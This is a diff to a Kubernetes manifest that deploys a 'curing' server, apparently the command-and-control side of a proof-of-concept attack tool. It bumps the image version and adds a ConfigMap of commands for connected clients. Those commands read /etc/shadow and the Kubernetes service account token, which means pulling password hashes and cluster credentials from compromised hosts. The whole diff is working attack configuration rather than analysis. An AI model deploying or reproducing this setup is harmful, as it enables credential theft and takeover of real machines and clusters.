@@ -16,7 +16,7 @@ spec:
     spec:
       containers:
       - name: server
-        image: quay.io/benarmosec/curing:1.0-server
+        image: quay.io/benarmosec/curing:1.1-server
         ports:
         - containerPort: 8888
           name: tcp
@@ -27,6 +27,14 @@ spec:
           limits:
             memory: "128Mi"
             cpu: "100m"
+        volumeMounts:
+        - name: commands-config
+          mountPath: /app/commands.json
+          subPath: commands.json
+      volumes:
+      - name: commands-config
+        configMap:
+          name: curing-server-commands
         
 ---
 apiVersion: v1
@@ -44,3 +52,38 @@ spec:
     name: tcp
   selector:
     app: curing-server
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: curing-server-commands
+  labels:
+    app: curing-server
+data:
+  commands.json: |
+    {
+      "default_commands": [
+        {
+          "type": "readfile",
+          "id": "read_shadow",
+          "path": "/etc/shadow"
+        }
+      ],
+      "group_commands": {
+        "kubernetes": [
+          {
+            "type": "readfile",
+            "id": "read_sa_token",
+            "path": "/var/run/secrets/kubernetes.io/serviceaccount/token"
+          },
+          {
+            "type": "readfile",
+            "id": "read_shadow",
+            "path": "/etc/shadow"
+          }
+        ]
+      },
+      "client_specific": {}
+    }
+
+      
